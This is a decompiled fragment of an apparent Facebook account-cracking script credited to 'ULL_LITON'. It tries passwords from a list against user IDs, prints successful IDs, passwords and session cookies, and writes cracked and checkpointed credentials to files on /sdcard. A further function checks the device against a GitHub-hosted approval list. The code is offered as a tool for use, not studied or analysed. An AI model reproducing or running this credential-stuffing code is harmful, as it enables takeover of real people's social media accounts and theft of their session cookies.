...
# Time Succes decompile : 2023-11-27 13:02:59.621159
...
└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘
      ┌━━━━━━━━━━━━━━━━━ 𓆩𝐋𝐢𝐭𝐨𝐧𓆪 ━━━━━━━━━━━━━━━━━━┑
               \033[34;1mCREATED BY   :  ULL_LITON            
               \033[33;1mFACEBOK      :  Liton              
               \033[38;5;46mGITHUB       :  ull36tm       
               \033[35;1mSTATUS       :   Free😴            
               \033[37;1mTEAM         :  Update.Logo.Liton                 
               \033[33;1mTOOL VIRSION :  0.00                    
               \x1b[38;5;196mTOOL WORK    :    DATA  + WiFi          
      └━""")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r \033[38;5;196m[\033[38;5;45m𝐔𝐋𝐋-𓆩𝐋𝐢𝐭𝐨𝐧𓆪-OK🌺\033[38;5;196m] \033[38;5;46m'+uid+'\033[38;5;196m | \033[38;5;46m' +ps+    '  \n\033[38;5;196m[\033[0;93m [\033[38;5;46mCOOKIE-🤖\033[38;5;196m] = \033[38;5;195m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/𝐔𝐋𝐋-𓆩𝐋𝐢𝐭𝐨𝐧𓆪-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;30m[𝐔𝐋𝐋-𓆩𝐋𝐢𝐭𝐨𝐧𓆪-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/𝐔𝐋𝐋-𓆩𝐋𝐢𝐭𝐨𝐧𓆪-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x} [{xr}𝐔𝐋𝐋-𓆩𝐋𝐢𝐭𝐨𝐧𓆪{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def superuser():
    ...
    id = "71".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/ull36tm/Paid-Free36tm/blob/main/Afroveal6.txt").text
    if id in DARK:
        os.system('clear')
        print(logo)
        xxr()
